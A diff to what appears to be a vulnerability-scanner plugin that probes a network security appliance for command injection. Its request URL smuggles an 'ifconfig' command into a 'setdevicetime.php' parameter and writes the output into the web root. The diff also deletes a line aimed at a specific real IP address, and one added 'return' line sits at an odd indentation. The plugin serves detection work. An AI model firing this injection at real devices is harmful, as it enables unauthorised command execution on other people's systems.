@@ -28,6 +28,7 @@ def audit(arg):
             #print res
             if code==200 and ('testvul'+str(i)) in res:
                 security_hole('command execution: ' + payload)
+                return arg
     #有限制的命令执行（不能有空格,,,）
     url = arg + 'protocol/devicestatus/setdevicetime.php?procotalarray[messagecontent]=a|ifconfig>/Isc/third-party/httpd/htdocs/test.txt%20b'
     code, head, res, err, _ = curl.curl2(url)
@@ -36,6 +37,7 @@ def audit(arg):
         if (code==200) and ('Link encap' in res):
             security_hole('Command Execution: ' + url)
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('ns-asg', 'https://121.28.81.124/')[1])
